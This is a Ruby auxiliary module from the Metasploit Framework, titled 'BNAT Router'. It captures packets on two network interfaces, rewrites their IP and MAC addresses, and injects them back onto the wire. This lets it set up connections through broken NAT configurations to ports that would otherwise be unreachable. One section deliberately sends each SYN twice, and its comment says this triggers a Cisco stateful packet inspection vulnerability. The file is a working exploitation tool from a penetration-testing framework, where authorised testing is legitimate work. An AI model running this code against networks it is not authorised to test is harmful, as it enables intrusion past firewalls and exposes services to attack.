##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  def initialize
    super(
      'Name'         => 'BNAT Router',
      'Description'  => %q{
          This module will properly route BNAT traffic and allow for connections to be
        established to machines on ports which might not otherwise be accessible.},
      'Author'       =>
        [
            'bannedit',
            'Jonathan Claudius',
        ],
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'https://github.com/claudijd/BNAT-Suite'],
          [ 'URL', 'http://www.slideshare.net/claudijd/dc-skytalk-bnat-hijacking-repairing-broken-communication-channels'],
        ]
    )
    register_options(
        [
          OptString.new('OUTINF',    [true, 'The external interface connected to the internet', 'eth1']),
          OptString.new('ININF',     [true, 'The internal interface connected to the network', 'eth2']),
          OptString.new('CLIENTIP',  [true, 'The ip of the client behing the BNAT router', '192.168.3.2']),
          OptString.new('SERVERIP',  [true, 'The ip of the server you are targeting', '1.1.2.1']),
          OptString.new('BNATIP',    [true, 'The ip of the bnat response you are getting', '1.1.2.2']),
        ],self.class)
  end

  def run
    clientip = datastore['CLIENTIP']
    serverip = datastore['SERVERIP']
    bnatip =   datastore['BNATIP']
    outint =   datastore['OUTINF']
    inint =    datastore['ININF']

    clientmac = arp2(clientip,inint)
    print_line("Obtained Client MAC: #{clientmac}")
    servermac = arp2(serverip,outint)
    print_line("Obtained Server MAC: #{servermac}")
    bnatmac = arp2(bnatip,outint)
    print_line("Obtained BNAT MAC: #{bnatmac}\n\n")

    #Create Interface Specific Configs
    outconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{outint}").config
    inconfig =  PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{inint}").config

    #Set Captures for Traffic coming from Outside and from Inside respectively
    outpcap = PacketFu::Capture.new( :iface => "#{outint}", :start => true, :filter => "tcp and src #{bnatip}" )
    print_line("Now listening on #{outint}...")

    inpcap = PacketFu::Capture.new( :iface => "#{inint}", :start => true, :filter => "tcp and src #{clientip} and dst #{serverip}" )
    print_line("Now listening on #{inint}...\n\n")

    #Start Thread from Outside Processing
    fromout = Thread.new do
      loop do
        outpcap.stream.each do |pkt|
          packet = PacketFu::Packet.parse(pkt)

          #Build a shell packet that will never hit the wire as a hack to get desired mac's
          shell_pkt = PacketFu::TCPPacket.new(:config => inconfig, :timeout => 0.1, :flavor => "Windows")
          shell_pkt.ip_daddr = clientip
          shell_pkt.recalc

          #Mangle Received Packet and Drop on the Wire
          packet.ip_saddr = serverip
          packet.ip_daddr = clientip
          packet.eth_saddr = shell_pkt.eth_saddr
          packet.eth_daddr = clientmac
          packet.recalc
          inj = PacketFu::Inject.new( :iface => "#{inint}", :config => inconfig )
          inj.a2w(:array => [packet.to_s])
          print_status("inpacket processed")
        end
      end
    end

    #Start Thread from Inside Processing
    fromin = Thread.new do
      loop do
        inpcap.stream.each do |pkt|
          packet = PacketFu::Packet.parse(pkt)

          if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
            packet.ip_daddr = serverip
            packet.eth_daddr = servermac
          else
            packet.ip_daddr = bnatip
            packet.eth_daddr = bnatmac
          end

          #Build a shell packet that will never hit the wire as a hack to get desired mac's
          shell_pkt = PacketFu::TCPPacket.new(:config=>outconfig, :timeout=> 0.1, :flavor=>"Windows")
          shell_pkt.ip_daddr = serverip
          shell_pkt.recalc

          #Mangle Received Packet and Drop on the Wire
          packet.eth_saddr = shell_pkt.eth_saddr
          packet.ip_saddr=shell_pkt.ip_saddr
          packet.recalc
          inj = PacketFu::Inject.new( :iface => "#{outint}", :config =>outconfig )
          inj.a2w(:array => [packet.to_s])

          #Trigger Cisco SPI Vulnerability by Double-tapping the SYN
          if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
            Rex.sleep(0.75)
            inj.a2w(:array => [packet.to_s])
          end
          print_status("outpacket processed")
        end
      end
    end
    fromout.join
    fromin.join
  end

  def arp2(target_ip,int)
    config = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{int}").config
    arp_pkt = PacketFu::ARPPacket.new(:flavor => "Windows")
    arp_pkt.eth_saddr = arp_pkt.arp_saddr_mac = config[:eth_saddr]
    arp_pkt.eth_daddr = "ff:ff:ff:ff:ff:ff"
    arp_pkt.arp_daddr_mac = "00:00:00:00:00:00"
    arp_pkt.arp_saddr_ip = config[:ip_saddr]
    arp_pkt.arp_daddr_ip = target_ip
    cap = PacketFu::Capture.new(:iface => config[:iface], :start => true, :filter => "arp src #{target_ip} and ether dst #{arp_pkt.eth_saddr}")
    injarp = PacketFu::Inject.new(:iface => config[:iface])
    injarp.a2w(:array => [arp_pkt.to_s])
    target_mac = nil

    while target_mac.nil?
      if cap.save > 0
        arp_response = PacketFu::Packet.parse(cap.array[0])
        target_mac = arp_response.arp_saddr_mac if arp_response.arp_saddr_ip = target_ip
      end
      Rex.sleep(0.1) # Check for a response ten times per second.
    end
    return target_mac
  end
end
